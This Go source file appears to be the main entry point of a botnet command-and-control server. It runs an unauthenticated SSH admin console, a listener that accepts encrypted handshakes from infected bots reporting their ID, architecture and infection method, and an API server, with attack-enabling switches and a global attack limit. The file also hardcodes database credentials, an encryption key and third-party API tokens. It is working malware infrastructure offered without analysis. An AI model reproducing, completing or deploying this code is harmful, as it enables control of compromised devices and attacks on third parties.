package main

import (
	"bytes"
	"fmt"
	"net"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var AdminsOnline int32 = 0
var AttacksEnabled int32 = 1

const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "messironaldo2025"
const DatabaseTable string = "botnet"

const BotPort string = "1939"
const AdminPort string = "3567"
const EncKey string = "paolo_next_2025"
const MaxGlobalAttacks int = 5

var IpInfoTokens = []string{
	"6593207a902cdc",
	"c3ccc704041780",
	"557a7dac4819a3",
}

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

const ApiPort string = "8080"

func main() {
	if err := initLogger(); err != nil {
		fmt.Println("Error initializing logger:", err)
		return
	}
	go StartAPIServer(ApiPort)
	go adminListener()

	botListener()
}

func adminListener() {
	config := &ssh.ServerConfig{
		NoClientAuth: true,
	}

	hostKey, err := getHostKey()
	if err != nil {
		fmt.Println("Error loading host key:", err)
		return
	}
	config.AddHostKey(hostKey)

	l, err := net.Listen("tcp", "0.0.0.0:"+AdminPort)
	if err != nil {
		fmt.Println("Admin Listen Error:", err)
		return
	}
	fmt.Println("Admin CNC SSH listening on " + AdminPort)

	// Panic Recovery for Admin Listener
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered from panic in adminListener:", r)
		}
	}()

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
		if err != nil {
			continue
		}

		atomic.AddInt32(&AdminsOnline, 1)
		go ssh.DiscardRequests(reqs)
		go handleSSHChannel(sshConn, chans)
	}
}

func handleSSHChannel(conn *ssh.ServerConn, chans <-chan ssh.NewChannel) {
	defer atomic.AddInt32(&AdminsOnline, -1)
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered from panic in handleSSHChannel:", r)
		}
	}()
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}

		go NewAdmin(channel, conn).Handle(requests)
	}
}

func botListener() {
	l, err := net.Listen("tcp", "0.0.0.0:"+BotPort)
	if err != nil {
		fmt.Println("Bot Listen Error:", err)
		return
	}
	fmt.Println("Bot Listener ready on " + BotPort)

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}
		go handleBotHandshake(conn)
	}
}

func handleBotHandshake(conn net.Conn) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered from panic in handleBotHandshake:", r)
			conn.Close()
		}
	}()

	conn.SetDeadline(time.Now().Add(15 * time.Second))

	nonce := make([]byte, 12)
	if _, err := readXBytes(conn, nonce); err != nil {
		conn.Close()
		return
	}

	encData := make([]byte, 113)
	if _, err := readXBytes(conn, encData); err != nil {
		conn.Close()
		return
	}

	decrypted, err := ChaCha20Encrypt(encData, []byte(EncKey), nonce)
	if err != nil {
		conn.Close()
		return
	}

	if decrypted[0] != 0x01 {
		conn.Close()
		return
	}

	// Bytes 1-65: Bot ID (64 bytes)
	botID := string(bytes.TrimRight(decrypted[1:65], "\x00"))

	// Bytes 65-81: Arch (16 bytes)
	arch := string(bytes.TrimRight(decrypted[65:81], "\x00"))

	// Infection Method (32 bytes)
	infMethod := string(bytes.TrimRight(decrypted[81:113], "\x00"))

	// Reset Deadline for long-term connection
	conn.SetDeadline(time.Time{})

	// Hand off to ClientList
	NewBot(conn, botID, arch, infMethod).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (int, error) {
	tl := 0
	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return tl, err
		}
		if n <= 0 {
			return tl, fmt.Errorf("connection closed")
		}
		tl += n
	}
	return tl, nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
